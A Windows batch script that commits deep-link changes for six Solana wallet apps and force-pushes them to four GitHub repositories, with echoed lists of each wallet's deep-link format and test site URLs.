@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing deep links for all wallet handlers...
echo.
echo Changes made:
echo - Added Exodus deep link handling in openInWallet function
echo - Added Exodus button to wallet browser prompt
echo - Verified all wallet deep links are properly configured
echo - All wallets now have working deep links for mobile
echo.
echo Deep link configurations:
echo - Phantom: phantom://app/ + encoded URL
echo - Solflare: solflare://access-wallet?url= + encoded URL
echo - Backpack: https://backpack.app/dapp/ + current URL
echo - Glow: https://glow.app/ul/browse/ + encoded URL
echo - Trust Wallet: https://link.trustwallet.com/open_url?coin_id=501&url= + encoded URL
echo - Exodus: https://exodus.com/ul/browse/ + encoded URL
echo.
echo Committing deep link fixes...
git add .
git commit -m "FIX: Deep links for all wallet handlers - added Exodus deep link and verified all others"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing deep link fixes to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Deep link fixes pushed to all repositories.
echo.
echo Summary:
echo - All 6 wallet types now have working deep links
echo - Mobile users can open sites directly in wallet browsers
echo - Desktop users get proper wallet detection
echo - All wallets have proper fee calculations and handlers
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Test all wallet types:
echo 1. Phantom - deep link: phantom://app/
echo 2. Solflare - deep link: solflare://access-wallet?url=
echo 3. Backpack - deep link: https://backpack.app/dapp/
echo 4. Glow - deep link: https://glow.app/ul/browse/
echo 5. Trust Wallet - deep link: https://link.trustwallet.com/open_url?coin_id=501&url=
echo 6. Exodus - deep link: https://exodus.com/ul/browse/
echo.
echo All wallets should now work with proper deep links and handlers!
pause
